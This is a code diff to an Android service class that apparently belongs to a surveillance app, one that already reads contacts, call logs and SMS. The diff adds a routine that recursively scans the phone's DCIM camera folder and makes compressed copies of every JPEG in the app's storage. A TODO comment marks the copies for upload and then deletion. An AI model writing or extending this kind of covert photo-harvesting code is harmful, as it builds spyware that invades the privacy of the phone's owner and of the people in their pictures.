@@ -7,7 +7,9 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
 import android.net.Uri;
+import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
@@ -19,10 +21,17 @@ import com.fs.fs.bean.SMSInfo;
 import com.fs.fs.receivers.SMSReceiver;
 import com.fs.fs.utils.Constant;
 import com.fs.fs.utils.DateUtils;
+import com.fs.fs.utils.FileUtils;
+import com.fs.fs.utils.ImageUtils;
 import com.fs.fs.utils.LogUtils;
 import com.fs.fs.utils.SharePreferencesUtils;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 /**
@@ -191,5 +200,51 @@ public class ProviderService {
         info.type = type;
         return info;
     }
+
+    public void getPictures() {
+        //TODO: SharePreferencesUtils保存结果对比更新
+        File root = new File(Environment.getExternalStorageDirectory() + "/DCIM/");
+        File[] files = root.listFiles();
+        if (files == null) {
+            return;
+        }
+        getPicture(files);
+    }
+
+    private void getPicture(File[] files) {
+        for (File file : files) {
+            if (file.isDirectory() && !file.isHidden()) {
+                getPicture(file.listFiles());
+            } else if (file.getAbsolutePath().endsWith(".jpg")) {
+                String path = file.getAbsolutePath();
+                Bitmap bitmap = ImageUtils.resize(path, 640, 640);
+                String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "jpg");
+                FileOutputStream out = null;
+                try {
+                    fileName = FileUtils.getExternalFullPath(mContext, fileName);
+                    LogUtils.d(fileName);
+                    out = new FileOutputStream(fileName);
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out);
+                    // TODO:上传并删除
+                } catch (FileNotFoundException e) {
+                    e.printStackTrace();
+                } finally {
+                    try {
+                        if (out != null) {
+                            out.close();
+                        }
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+                    if (bitmap != null && !bitmap.isRecycled()) {
+                        bitmap.recycle();
+                        bitmap = null;
+                    }
+                }
+            }
+        }
+    }
+
 
 }
